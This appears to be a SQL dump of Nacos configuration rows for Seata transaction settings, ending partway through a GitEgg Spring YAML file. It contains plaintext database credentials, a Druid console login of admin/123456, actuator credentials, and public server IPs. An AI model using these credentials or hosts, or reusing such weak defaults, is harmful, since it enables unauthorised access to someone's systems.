INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (99, 'service.disableGlobalTransaction', 'SEATA_GROUP', 'false', '68934a3e9455fa72420237eb05902327', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (100, 'client.rm.asyncCommitBufferLimit', 'SEATA_GROUP', '10000', 'b7a782741f667201b54880c925faec4b', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (101, 'client.rm.lock.retryInterval', 'SEATA_GROUP', '10', 'd3d9446802a44259755d38e6d163e820', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (102, 'client.rm.lock.retryTimes', 'SEATA_GROUP', '30', '34173cb38f07f89ddbebc2ac9128303f', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (103, 'client.rm.lock.retryPolicyBranchRollbackOnConflict', 'SEATA_GROUP', 'true', 'b326b5062b2f0e69046810717534cb09', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (104, 'client.rm.reportRetryCount', 'SEATA_GROUP', '5', 'e4da3b7fbbce2345d7772b0674a318d5', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (105, 'client.rm.tableMetaCheckEnable', 'SEATA_GROUP', 'false', '68934a3e9455fa72420237eb05902327', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (106, 'client.rm.sqlParserType', 'SEATA_GROUP', 'druid', '3d650fb8a5df01600281d48c47c9fa60', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (107, 'client.rm.reportSuccessEnable', 'SEATA_GROUP', 'false', '68934a3e9455fa72420237eb05902327', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (108, 'client.rm.sagaBranchRegisterEnable', 'SEATA_GROUP', 'false', '68934a3e9455fa72420237eb05902327', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (109, 'client.tm.commitRetryCount', 'SEATA_GROUP', '5', 'e4da3b7fbbce2345d7772b0674a318d5', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (110, 'client.tm.rollbackRetryCount', 'SEATA_GROUP', '5', 'e4da3b7fbbce2345d7772b0674a318d5', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (111, 'client.tm.defaultGlobalTransactionTimeout', 'SEATA_GROUP', '60000', '2b4226dd7ed6eb2d419b881f3ae9c97c', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (112, 'client.tm.degradeCheck', 'SEATA_GROUP', 'false', '68934a3e9455fa72420237eb05902327', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (113, 'client.tm.degradeCheckAllowTimes', 'SEATA_GROUP', '10', 'd3d9446802a44259755d38e6d163e820', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (114, 'client.tm.degradeCheckPeriod', 'SEATA_GROUP', '2000', '08f90c1a417155361a5c4b8d297e0d78', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (115, 'store.mode', 'SEATA_GROUP', 'db', 'd77d5e503ad1439f585ac494268b351b', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (116, 'store.file.dir', 'SEATA_GROUP', 'file_store/data', '6a8dec07c44c33a8a9247cba5710bbb2', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (117, 'store.file.maxBranchSessionSize', 'SEATA_GROUP', '16384', 'c76fe1d8e08462434d800487585be217', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (118, 'store.file.maxGlobalSessionSize', 'SEATA_GROUP', '512', '10a7cdd970fe135cf4f7bb55c0e3b59f', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (119, 'store.file.fileWriteBufferCacheSize', 'SEATA_GROUP', '16384', 'c76fe1d8e08462434d800487585be217', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (120, 'store.file.flushDiskMode', 'SEATA_GROUP', 'async', '0df93e34273b367bb63bad28c94c78d5', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (121, 'store.file.sessionReloadReadSize', 'SEATA_GROUP', '100', 'f899139df5e1059396431415e770c6dd', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (122, 'store.db.datasource', 'SEATA_GROUP', 'druid', '3d650fb8a5df01600281d48c47c9fa60', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (123, 'store.db.dbType', 'SEATA_GROUP', 'mysql', '81c3b080dad537de7e10e0987a4bf52e', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (124, 'store.db.driverClassName', 'SEATA_GROUP', 'com.mysql.jdbc.Driver', '683cf0c3a5a56cec94dfac94ca16d760', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (125, 'store.db.url', 'SEATA_GROUP', 'jdbc:mysql://172.16.20.188:3306/seata?useUnicode=true', '069db0ee6ef2aa96c6afe1c43a57136f', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (126, 'store.db.user', 'SEATA_GROUP', 'myHisc', '5295b03958856d43e9436aa490ec9719', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (127, 'store.db.password', 'SEATA_GROUP', 'root4Hisc', '3683c0f474788309d25d434251780a46', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (128, 'store.db.minConn', 'SEATA_GROUP', '5', 'e4da3b7fbbce2345d7772b0674a318d5', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (129, 'store.db.maxConn', 'SEATA_GROUP', '30', '34173cb38f07f89ddbebc2ac9128303f', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (130, 'store.db.globalTable', 'SEATA_GROUP', 'global_table', '8b28fb6bb4c4f984df2709381f8eba2b', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (131, 'store.db.branchTable', 'SEATA_GROUP', 'branch_table', '54bcdac38cf62e103fe115bcf46a660c', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (132, 'store.db.queryLimit', 'SEATA_GROUP', '100', 'f899139df5e1059396431415e770c6dd', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (133, 'store.db.lockTable', 'SEATA_GROUP', 'lock_table', '55e0cae3b6dc6696b768db90098b8f2f', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (134, 'store.db.maxWait', 'SEATA_GROUP', '5000', 'a35fe7f7fe8217b4369a0af4244d1fca', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (135, 'store.redis.host', 'SEATA_GROUP', '39.98.125.88', 'a23de94098343f1cf512ff8bab24b9b7', '2024-08-07 10:36:56', '2024-08-07 11:17:49', 'nacos', '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', '', '', '', 'text', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (136, 'store.redis.port', 'SEATA_GROUP', '6379', '92c3b916311a5517d9290576e3ea37ad', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (137, 'store.redis.maxConn', 'SEATA_GROUP', '10', 'd3d9446802a44259755d38e6d163e820', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (138, 'store.redis.minConn', 'SEATA_GROUP', '1', 'c4ca4238a0b923820dcc509a6f75849b', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (139, 'store.redis.database', 'SEATA_GROUP', '0', 'cfcd208495d565ef66e7dff9f98764da', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (140, 'store.redis.password', 'SEATA_GROUP', 'null', '37a6259cc0c1dae299a7866489dff0bd', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (141, 'store.redis.queryLimit', 'SEATA_GROUP', '100', 'f899139df5e1059396431415e770c6dd', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (142, 'server.recovery.committingRetryPeriod', 'SEATA_GROUP', '1000', 'a9b7ba70783b617e9998dc4dd82eb3c5', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (143, 'server.recovery.asynCommittingRetryPeriod', 'SEATA_GROUP', '1000', 'a9b7ba70783b617e9998dc4dd82eb3c5', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (144, 'server.recovery.rollbackingRetryPeriod', 'SEATA_GROUP', '1000', 'a9b7ba70783b617e9998dc4dd82eb3c5', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (145, 'server.recovery.timeoutRetryPeriod', 'SEATA_GROUP', '1000', 'a9b7ba70783b617e9998dc4dd82eb3c5', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (146, 'server.maxCommitRetryTimeout', 'SEATA_GROUP', '-1', '6bb61e3b7bce0931da574d19d1d82c88', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (147, 'server.maxRollbackRetryTimeout', 'SEATA_GROUP', '-1', '6bb61e3b7bce0931da574d19d1d82c88', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (148, 'server.rollbackRetryTimeoutUnlockEnable', 'SEATA_GROUP', 'false', '68934a3e9455fa72420237eb05902327', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (149, 'client.undo.dataValidation', 'SEATA_GROUP', 'true', 'b326b5062b2f0e69046810717534cb09', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (150, 'client.undo.logSerialization', 'SEATA_GROUP', 'jackson', 'b41779690b83f182acc67d6388c7bac9', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (151, 'client.undo.onlyCareUpdateColumns', 'SEATA_GROUP', 'true', 'b326b5062b2f0e69046810717534cb09', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (152, 'server.undo.logSaveDays', 'SEATA_GROUP', '7', '8f14e45fceea167a5a36dedd4bea2543', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (153, 'server.undo.logDeletePeriod', 'SEATA_GROUP', '86400000', 'f4c122804fe9076cb2710f55c3c6e346', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (154, 'client.undo.logTable', 'SEATA_GROUP', 'undo_log', '2842d229c24afe9e61437135e8306614', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (155, 'log.exceptionRate', 'SEATA_GROUP', '100', 'f899139df5e1059396431415e770c6dd', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (156, 'transport.serialization', 'SEATA_GROUP', 'seata', 'b943081c423b9a5416a706524ee05d40', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (157, 'transport.compressor', 'SEATA_GROUP', 'none', '334c4a4c42fdb79d7ebc3e73b517e6f8', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (158, 'metrics.enabled', 'SEATA_GROUP', 'false', '68934a3e9455fa72420237eb05902327', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (159, 'metrics.registryType', 'SEATA_GROUP', 'compact', '7cf74ca49c304df8150205fc915cd465', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (160, 'metrics.exporterList', 'SEATA_GROUP', 'prometheus', 'e4f00638b8a10e6994e67af2f832d51c', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (161, 'metrics.exporterPrometheusPort', 'SEATA_GROUP', '9898', '7b9dc501afe4ee11c56a4831e20cee71', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (162, 'service.vgroupMapping.gitegg_seata_tx_group', 'SEATA_GROUP', 'default', 'c21f969b5f03d33d43e04f8f136e7682', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'text', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (163, 'gitegg-cloud-config.yaml', 'GITEGG_CLOUD', 'spring:
  jackson:
    time-zone: Asia/Shanghai
    date-format: yyyy-MM-dd HH:mm:ss
  servlet:
    multipart:
      max-file-size: 2048MB
      max-request-size: 2048MB
  security:
    # # 启用SpringBootAdmin时，健康检查权限校验，不使用SpringBootAdmin此处可省略
    user:
      name: user
      password: password
      roles: ACTUATOR_ADMIN
    oauth2:
      resourceserver:
        jwt:
          jwk-set-uri: \'http://39.98.125.88/gitegg-oauth/oauth/public_key\'
  autoconfigure:
    # 动态数据源排除默认配置
    exclude: 
      - com.alibaba.druid.spring.boot.autoconfigure.DruidDataSourceAutoConfigure
      # Spring Cloud Stream 禁用 RabbitAutoConfiguration
      #- org.springframework.boot.autoconfigure.amqp.RabbitAutoConfiguration
  # main:
  #   allow-bean-definition-overriding: true
  datasource: 
    druid:
      stat-view-servlet:
        enabled: true
        loginUsername: admin
        loginPassword: 123456
    dynamic:
